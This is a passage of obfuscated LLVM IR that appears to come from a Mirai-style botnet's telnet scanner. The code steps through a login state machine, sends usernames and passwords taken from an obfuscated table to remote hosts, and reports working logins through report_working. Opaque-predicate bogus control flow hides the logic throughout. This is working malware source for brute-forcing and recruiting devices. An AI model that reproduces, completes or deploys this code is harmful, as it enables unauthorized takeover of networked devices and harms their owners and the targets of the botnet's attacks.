  %1220 = or i1 %1218, %1219
  br i1 %1220, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1223

; <label>:1221:                                   ; preds = %1187
  %1222 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1222)
  br label %1223

; <label>:1223:                                   ; preds = %1221, %originalBBpart2180
  %1224 = load i32, i32* @x.53
  %1225 = load i32, i32* @y.54
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1223
  %1232 = load i32, i32* @x.53
  %1233 = load i32, i32* @y.54
  %1234 = sub i32 %1232, 1
  %1235 = mul i32 %1232, %1234
  %1236 = urem i32 %1235, 2
  %1237 = icmp eq i32 %1236, 0
  %1238 = icmp slt i32 %1233, 10
  %1239 = or i1 %1237, %1238
  br i1 %1239, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1240

; <label>:1240:                                   ; preds = %originalBBpart2184, %originalBBpart2176, %1163
  br label %1693

; <label>:1241:                                   ; preds = %1160
  %1242 = load i32, i32* %32, align 4
  %1243 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1244 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1243, i32 0, i32 6
  %1245 = load i32, i32* %1244, align 4
  %1246 = add nsw i32 %1245, %1242
  store i32 %1246, i32* %1244, align 4
  %1247 = load i32, i32* @fake_time, align 4
  %1248 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1249 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1248, i32 0, i32 2
  store i32 %1247, i32* %1249, align 4
  br label %1250

; <label>:1250:                                   ; preds = %1691, %1241
  %1251 = load i32, i32* @x.53
  %1252 = load i32, i32* @y.54
  %1253 = sub i32 %1251, 1
  %1254 = mul i32 %1251, %1253
  %1255 = urem i32 %1254, 2
  %1256 = icmp eq i32 %1255, 0
  %1257 = icmp slt i32 %1252, 10
  %1258 = or i1 %1256, %1257
  br i1 %1258, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1250
  store i32 0, i32* %33, align 4
  %1259 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1260 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1259, i32 0, i32 3
  %1261 = load i32, i32* %1260, align 8
  %1262 = load i32, i32* @x.53
  %1263 = load i32, i32* @y.54
  %1264 = sub i32 %1262, 1
  %1265 = mul i32 %1262, %1264
  %1266 = urem i32 %1265, 2
  %1267 = icmp eq i32 %1266, 0
  %1268 = icmp slt i32 %1263, 10
  %1269 = or i1 %1267, %1268
  br i1 %1269, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  switch i32 %1261, label %1657 [
    i32 2, label %1270
    i32 3, label %1294
    i32 4, label %1353
    i32 5, label %1396
    i32 6, label %1464
    i32 7, label %1500
    i32 8, label %1520
    i32 9, label %1540
    i32 10, label %1560
  ]

; <label>:1270:                                   ; preds = %originalBBpart2188
  %1271 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1272 = call i32 @consume_iacs(%struct.scanner_connection* %1271)
  store i32 %1272, i32* %33, align 4
  %1273 = icmp sgt i32 %1272, 0
  br i1 %1273, label %1274, label %1293

; <label>:1274:                                   ; preds = %1270
  %1275 = load i32, i32* @x.53
  %1276 = load i32, i32* @y.54
  %1277 = sub i32 %1275, 1
  %1278 = mul i32 %1275, %1277
  %1279 = urem i32 %1278, 2
  %1280 = icmp eq i32 %1279, 0
  %1281 = icmp slt i32 %1276, 10
  %1282 = or i1 %1280, %1281
  br i1 %1282, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1274
  %1283 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1284 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1283, i32 0, i32 3
  store i32 3, i32* %1284, align 8
  %1285 = load i32, i32* @x.53
  %1286 = load i32, i32* @y.54
  %1287 = sub i32 %1285, 1
  %1288 = mul i32 %1285, %1287
  %1289 = urem i32 %1288, 2
  %1290 = icmp eq i32 %1289, 0
  %1291 = icmp slt i32 %1286, 10
  %1292 = or i1 %1290, %1291
  br i1 %1292, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1293

; <label>:1293:                                   ; preds = %originalBBpart2192, %1270
  br label %1658

; <label>:1294:                                   ; preds = %originalBBpart2188
  %1295 = load i32, i32* @x.53
  %1296 = load i32, i32* @y.54
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1294
  %1303 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1304 = call i32 @consume_user_prompt(%struct.scanner_connection* %1303)
  store i32 %1304, i32* %33, align 4
  %1305 = icmp sgt i32 %1304, 0
  %1306 = load i32, i32* @x.53
  %1307 = load i32, i32* @y.54
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1305, label %1314, label %1352

; <label>:1314:                                   ; preds = %originalBBpart2196
  %1315 = load i32, i32* @x.53
  %1316 = load i32, i32* @y.54
  %1317 = sub i32 %1315, 1
  %1318 = mul i32 %1315, %1317
  %1319 = urem i32 %1318, 2
  %1320 = icmp eq i32 %1319, 0
  %1321 = icmp slt i32 %1316, 10
  %1322 = or i1 %1320, %1321
  br i1 %1322, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1314
  %1323 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1324 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1323, i32 0, i32 1
  %1325 = load i32, i32* %1324, align 8
  %1326 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1327 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1326, i32 0, i32 0
  %1328 = load %struct.scanner_auth*, %struct.scanner_auth** %1327, align 8
  %1329 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1328, i32 0, i32 0
  %1330 = load i8*, i8** %1329, align 8
  %1331 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1332 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1331, i32 0, i32 0
  %1333 = load %struct.scanner_auth*, %struct.scanner_auth** %1332, align 8
  %1334 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1333, i32 0, i32 4
  %1335 = load i8, i8* %1334, align 4
  %1336 = zext i8 %1335 to i64
  %1337 = call i64 @send(i32 %1325, i8* %1330, i64 %1336, i32 16384)
  %1338 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1339 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1338, i32 0, i32 1
  %1340 = load i32, i32* %1339, align 8
  %1341 = call i64 @send(i32 %1340, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1342 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1343 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1342, i32 0, i32 3
  store i32 4, i32* %1343, align 8
  %1344 = load i32, i32* @x.53
  %1345 = load i32, i32* @y.54
  %1346 = sub i32 %1344, 1
  %1347 = mul i32 %1344, %1346
  %1348 = urem i32 %1347, 2
  %1349 = icmp eq i32 %1348, 0
  %1350 = icmp slt i32 %1345, 10
  %1351 = or i1 %1349, %1350
  br i1 %1351, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %1352

; <label>:1352:                                   ; preds = %originalBBpart2200, %originalBBpart2196
  br label %1658

; <label>:1353:                                   ; preds = %originalBBpart2188
  %1354 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1355 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1354)
  store i32 %1355, i32* %33, align 4
  %1356 = icmp sgt i32 %1355, 0
  br i1 %1356, label %1357, label %1395

; <label>:1357:                                   ; preds = %1353
  %1358 = load i32, i32* @x.53
  %1359 = load i32, i32* @y.54
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1357
  %1366 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1367 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1366, i32 0, i32 1
  %1368 = load i32, i32* %1367, align 8
  %1369 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1370 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1369, i32 0, i32 0
  %1371 = load %struct.scanner_auth*, %struct.scanner_auth** %1370, align 8
  %1372 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1371, i32 0, i32 1
  %1373 = load i8*, i8** %1372, align 8
  %1374 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1375 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1374, i32 0, i32 0
  %1376 = load %struct.scanner_auth*, %struct.scanner_auth** %1375, align 8
  %1377 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1376, i32 0, i32 5
  %1378 = load i8, i8* %1377, align 1
  %1379 = zext i8 %1378 to i64
  %1380 = call i64 @send(i32 %1368, i8* %1373, i64 %1379, i32 16384)
  %1381 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1382 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1381, i32 0, i32 1
  %1383 = load i32, i32* %1382, align 8
  %1384 = call i64 @send(i32 %1383, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1385 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1386 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1385, i32 0, i32 3
  store i32 5, i32* %1386, align 8
  %1387 = load i32, i32* @x.53
  %1388 = load i32, i32* @y.54
  %1389 = sub i32 %1387, 1
  %1390 = mul i32 %1387, %1389
  %1391 = urem i32 %1390, 2
  %1392 = icmp eq i32 %1391, 0
  %1393 = icmp slt i32 %1388, 10
  %1394 = or i1 %1392, %1393
  br i1 %1394, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1395

; <label>:1395:                                   ; preds = %originalBBpart2204, %1353
  br label %1658

; <label>:1396:                                   ; preds = %originalBBpart2188
  %1397 = load i32, i32* @x.53
  %1398 = load i32, i32* @y.54
  %1399 = sub i32 %1397, 1
  %1400 = mul i32 %1397, %1399
  %1401 = urem i32 %1400, 2
  %1402 = icmp eq i32 %1401, 0
  %1403 = icmp slt i32 %1398, 10
  %1404 = or i1 %1402, %1403
  br i1 %1404, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1396
  %1405 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1406 = call i32 @consume_any_prompt(%struct.scanner_connection* %1405)
  store i32 %1406, i32* %33, align 4
  %1407 = icmp sgt i32 %1406, 0
  %1408 = load i32, i32* @x.53
  %1409 = load i32, i32* @y.54
  %1410 = sub i32 %1408, 1
  %1411 = mul i32 %1408, %1410
  %1412 = urem i32 %1411, 2
  %1413 = icmp eq i32 %1412, 0
  %1414 = icmp slt i32 %1409, 10
  %1415 = or i1 %1413, %1414
  br i1 %1415, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1407, label %1416, label %1447

; <label>:1416:                                   ; preds = %originalBBpart2208
  %1417 = load i32, i32* @x.53
  %1418 = load i32, i32* @y.54
  %1419 = sub i32 %1417, 1
  %1420 = mul i32 %1417, %1419
  %1421 = urem i32 %1420, 2
  %1422 = icmp eq i32 %1421, 0
  %1423 = icmp slt i32 %1418, 10
  %1424 = or i1 %1422, %1423
  br i1 %1424, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1416
  call void @table_unlock_val(i8 zeroext 5)
  %1425 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1425, i8** %34, align 8
  %1426 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1427 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1426, i32 0, i32 1
  %1428 = load i32, i32* %1427, align 8
  %1429 = load i8*, i8** %34, align 8
  %1430 = load i32, i32* %35, align 4
  %1431 = sext i32 %1430 to i64
  %1432 = call i64 @send(i32 %1428, i8* %1429, i64 %1431, i32 16384)
  %1433 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1434 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1433, i32 0, i32 1
  %1435 = load i32, i32* %1434, align 8
  %1436 = call i64 @send(i32 %1435, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1437 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1438 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1437, i32 0, i32 3
  store i32 6, i32* %1438, align 8
  %1439 = load i32, i32* @x.53
  %1440 = load i32, i32* @y.54
  %1441 = sub i32 %1439, 1
  %1442 = mul i32 %1439, %1441
  %1443 = urem i32 %1442, 2
  %1444 = icmp eq i32 %1443, 0
  %1445 = icmp slt i32 %1440, 10
  %1446 = or i1 %1444, %1445
  br i1 %1446, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br label %1447

; <label>:1447:                                   ; preds = %originalBBpart2212, %originalBBpart2208
  %1448 = load i32, i32* @x.53
  %1449 = load i32, i32* @y.54
  %1450 = sub i32 %1448, 1
  %1451 = mul i32 %1448, %1450
  %1452 = urem i32 %1451, 2
  %1453 = icmp eq i32 %1452, 0
  %1454 = icmp slt i32 %1449, 10
  %1455 = or i1 %1453, %1454
  br i1 %1455, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1447
  %1456 = load i32, i32* @x.53
  %1457 = load i32, i32* @y.54
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %1658

; <label>:1464:                                   ; preds = %originalBBpart2188
  %1465 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1466 = call i32 @consume_any_prompt(%struct.scanner_connection* %1465)
  store i32 %1466, i32* %33, align 4
  %1467 = icmp sgt i32 %1466, 0
  br i1 %1467, label %1468, label %1483

; <label>:1468:                                   ; preds = %1464
  call void @table_unlock_val(i8 zeroext 6)
  %1469 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %1469, i8** %36, align 8
  %1470 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1471 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1470, i32 0, i32 1
  %1472 = load i32, i32* %1471, align 8
  %1473 = load i8*, i8** %36, align 8
  %1474 = load i32, i32* %37, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = call i64 @send(i32 %1472, i8* %1473, i64 %1475, i32 16384)
  %1477 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1478 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1477, i32 0, i32 1
  %1479 = load i32, i32* %1478, align 8
  %1480 = call i64 @send(i32 %1479, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1481 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1482 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1481, i32 0, i32 3
  store i32 7, i32* %1482, align 8
  br label %1483

; <label>:1483:                                   ; preds = %1468, %1464
  %1484 = load i32, i32* @x.53
  %1485 = load i32, i32* @y.54
  %1486 = sub i32 %1484, 1
  %1487 = mul i32 %1484, %1486
  %1488 = urem i32 %1487, 2
  %1489 = icmp eq i32 %1488, 0
  %1490 = icmp slt i32 %1485, 10
  %1491 = or i1 %1489, %1490
  br i1 %1491, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1483
  %1492 = load i32, i32* @x.53
  %1493 = load i32, i32* @y.54
  %1494 = sub i32 %1492, 1
  %1495 = mul i32 %1492, %1494
  %1496 = urem i32 %1495, 2
  %1497 = icmp eq i32 %1496, 0
  %1498 = icmp slt i32 %1493, 10
  %1499 = or i1 %1497, %1498
  br i1 %1499, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %1658

; <label>:1500:                                   ; preds = %originalBBpart2188
  %1501 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1502 = call i32 @consume_any_prompt(%struct.scanner_connection* %1501)
  store i32 %1502, i32* %33, align 4
  %1503 = icmp sgt i32 %1502, 0
  br i1 %1503, label %1504, label %1519

; <label>:1504:                                   ; preds = %1500
  call void @table_unlock_val(i8 zeroext 4)
  %1505 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1505, i8** %38, align 8
  %1506 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1507 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1506, i32 0, i32 1
  %1508 = load i32, i32* %1507, align 8
  %1509 = load i8*, i8** %38, align 8
  %1510 = load i32, i32* %39, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = call i64 @send(i32 %1508, i8* %1509, i64 %1511, i32 16384)
  %1513 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1514 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1513, i32 0, i32 1
  %1515 = load i32, i32* %1514, align 8
  %1516 = call i64 @send(i32 %1515, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1517 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1518 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1517, i32 0, i32 3
  store i32 8, i32* %1518, align 8
  br label %1519

; <label>:1519:                                   ; preds = %1504, %1500
  br label %1658

; <label>:1520:                                   ; preds = %originalBBpart2188
  %1521 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1522 = call i32 @consume_any_prompt(%struct.scanner_connection* %1521)
  store i32 %1522, i32* %33, align 4
  %1523 = icmp sgt i32 %1522, 0
  br i1 %1523, label %1524, label %1539

; <label>:1524:                                   ; preds = %1520
  call void @table_unlock_val(i8 zeroext 7)
  %1525 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1525, i8** %40, align 8
  %1526 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1527 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1526, i32 0, i32 1
  %1528 = load i32, i32* %1527, align 8
  %1529 = load i8*, i8** %40, align 8
  %1530 = load i32, i32* %41, align 4
  %1531 = sext i32 %1530 to i64
  %1532 = call i64 @send(i32 %1528, i8* %1529, i64 %1531, i32 16384)
  %1533 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1534 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1533, i32 0, i32 1
  %1535 = load i32, i32* %1534, align 8
  %1536 = call i64 @send(i32 %1535, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1537 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1538 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1537, i32 0, i32 3
  store i32 9, i32* %1538, align 8
  br label %1539

; <label>:1539:                                   ; preds = %1524, %1520
  br label %1658

; <label>:1540:                                   ; preds = %originalBBpart2188
  %1541 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1542 = call i32 @consume_any_prompt(%struct.scanner_connection* %1541)
  store i32 %1542, i32* %33, align 4
  %1543 = icmp sgt i32 %1542, 0
  br i1 %1543, label %1544, label %1559

; <label>:1544:                                   ; preds = %1540
  call void @table_unlock_val(i8 zeroext 8)
  %1545 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1545, i8** %42, align 8
  %1546 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1547 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1546, i32 0, i32 1
  %1548 = load i32, i32* %1547, align 8
  %1549 = load i8*, i8** %42, align 8
  %1550 = load i32, i32* %43, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = call i64 @send(i32 %1548, i8* %1549, i64 %1551, i32 16384)
  %1553 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1554 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1553, i32 0, i32 1
  %1555 = load i32, i32* %1554, align 8
  %1556 = call i64 @send(i32 %1555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1557 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1558 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1557, i32 0, i32 3
  store i32 10, i32* %1558, align 8
  br label %1559

; <label>:1559:                                   ; preds = %1544, %1540
  br label %1658

; <label>:1560:                                   ; preds = %originalBBpart2188
  %1561 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1562 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1561)
  store i32 %1562, i32* %33, align 4
  %1563 = load i32, i32* %33, align 4
  %1564 = icmp eq i32 %1563, -1
  br i1 %1564, label %1565, label %1586

; <label>:1565:                                   ; preds = %1560
  %1566 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1567 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1566, i32 0, i32 1
  %1568 = load i32, i32* %1567, align 8
  %1569 = call i32 @close(i32 %1568)
  %1570 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1571 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1570, i32 0, i32 1
  store i32 -1, i32* %1571, align 8
  %1572 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1573 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1572, i32 0, i32 8
  %1574 = load i8, i8* %1573, align 8
  %1575 = add i8 %1574, 1
  store i8 %1575, i8* %1573, align 8
  %1576 = zext i8 %1575 to i32
  %1577 = icmp eq i32 %1576, 10
  br i1 %1577, label %1578, label %1583

; <label>:1578:                                   ; preds = %1565
  %1579 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1580 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1579, i32 0, i32 8
  store i8 0, i8* %1580, align 8
  %1581 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1581, i32 0, i32 3
  store i32 0, i32* %1582, align 8
  br label %1585

; <label>:1583:                                   ; preds = %1565
  %1584 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1584)
  br label %1585

; <label>:1585:                                   ; preds = %1583, %1578
  br label %1640

; <label>:1586:                                   ; preds = %1560
  %1587 = load i32, i32* @x.53
  %1588 = load i32, i32* @y.54
  %1589 = sub i32 %1587, 1
  %1590 = mul i32 %1587, %1589
  %1591 = urem i32 %1590, 2
  %1592 = icmp eq i32 %1591, 0
  %1593 = icmp slt i32 %1588, 10
  %1594 = or i1 %1592, %1593
  br i1 %1594, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1586
  %1595 = load i32, i32* %33, align 4
  %1596 = icmp sgt i32 %1595, 0
  %1597 = load i32, i32* @x.53
  %1598 = load i32, i32* @y.54
  %1599 = sub i32 %1597, 1
  %1600 = mul i32 %1597, %1599
  %1601 = urem i32 %1600, 2
  %1602 = icmp eq i32 %1601, 0
  %1603 = icmp slt i32 %1598, 10
  %1604 = or i1 %1602, %1603
  br i1 %1604, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1596, label %1605, label %1639

; <label>:1605:                                   ; preds = %originalBBpart2224
  %1606 = load i32, i32* @x.53
  %1607 = load i32, i32* @y.54
  %1608 = sub i32 %1606, 1
  %1609 = mul i32 %1606, %1608
  %1610 = urem i32 %1609, 2
  %1611 = icmp eq i32 %1610, 0
  %1612 = icmp slt i32 %1607, 10
  %1613 = or i1 %1611, %1612
  br i1 %1613, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1605
  %1614 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1615 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1614, i32 0, i32 4
  %1616 = load i32, i32* %1615, align 4
  %1617 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1617, i32 0, i32 5
  %1619 = load i16, i16* %1618, align 8
  %1620 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1621 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1620, i32 0, i32 0
  %1622 = load %struct.scanner_auth*, %struct.scanner_auth** %1621, align 8
  call void @report_working(i32 %1616, i16 zeroext %1619, %struct.scanner_auth* %1622)
  %1623 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1624 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1623, i32 0, i32 1
  %1625 = load i32, i32* %1624, align 8
  %1626 = call i32 @close(i32 %1625)
  %1627 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1628 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1627, i32 0, i32 1
  store i32 -1, i32* %1628, align 8
  %1629 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1630 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1629, i32 0, i32 3
  store i32 0, i32* %1630, align 8
  %1631 = load i32, i32* @x.53
  %1632 = load i32, i32* @y.54
  %1633 = sub i32 %1631, 1
  %1634 = mul i32 %1631, %1633
  %1635 = urem i32 %1634, 2
  %1636 = icmp eq i32 %1635, 0
  %1637 = icmp slt i32 %1632, 10
  %1638 = or i1 %1636, %1637
  br i1 %1638, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %1639

; <label>:1639:                                   ; preds = %originalBBpart2228, %originalBBpart2224
  br label %1640

; <label>:1640:                                   ; preds = %1639, %1585
  %1641 = load i32, i32* @x.53
  %1642 = load i32, i32* @y.54
  %1643 = sub i32 %1641, 1
  %1644 = mul i32 %1641, %1643
  %1645 = urem i32 %1644, 2
  %1646 = icmp eq i32 %1645, 0
  %1647 = icmp slt i32 %1642, 10
  %1648 = or i1 %1646, %1647
  br i1 %1648, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1640
  %1649 = load i32, i32* @x.53
  %1650 = load i32, i32* @y.54
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %1658

; <label>:1657:                                   ; preds = %originalBBpart2188
  store i32 0, i32* %33, align 4
  br label %1658

; <label>:1658:                                   ; preds = %1657, %originalBBpart2232, %1559, %1539, %1519, %originalBBpart2220, %originalBBpart2216, %1395, %1352, %1293
  %1659 = load i32, i32* %33, align 4
  %1660 = icmp eq i32 %1659, 0
  br i1 %1660, label %1661, label %1662

; <label>:1661:                                   ; preds = %1658
